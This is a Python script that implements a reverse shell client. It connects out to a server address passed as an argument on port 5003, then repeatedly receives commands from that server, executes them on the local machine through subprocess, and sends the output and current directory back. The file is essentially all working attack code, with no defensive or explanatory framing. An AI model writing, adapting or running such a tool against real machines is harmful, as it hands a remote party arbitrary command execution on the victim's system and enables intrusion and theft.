import socket
import os
import subprocess
import sys
import utilities
import utilities.list_information

# initialize variables
SERVER_HOST = sys.argv[1]
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
SEPARATOR = "<sep>"

# create socket object
def initialize_socket():
    new_socket = socket.socket()
    new_socket.connect((SERVER_HOST, SERVER_PORT))
    cwd = os.getcwd()
    new_socket.send(cwd.encode())
    return new_socket

def handle_client_commands(socket, BUFFER_SIZE, SEPARATOR):
    while True:
        command = socket.recv(BUFFER_SIZE).decode()
        split_command = command.split()
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        if split_command and split_command[0].lower() == "cd":
            # cd command, change directory
            try:
                os.chdir(' '.join(split_command[1:]))
            except FileNotFoundError as e:
                # if there is an error, set as the output
                output = str(e)
            else:
                # if operation is successful, empty message
                output = ""
        if command.lower() == "list":
            output = utilities.list_information.list_information()
        else:
            output = subprocess.getoutput(command)
        # get the current working directory as output
        cwd = os.getcwd()
        message = f"{output}{SEPARATOR}{cwd}"
        socket.send(message.encode())

def close_socket(socket):
    socket.close()

def main():
    socket = initialize_socket()
    handle_client_commands(socket, BUFFER_SIZE, SEPARATOR)
    close_socket(socket)

if __name__ == "__main__":
            main()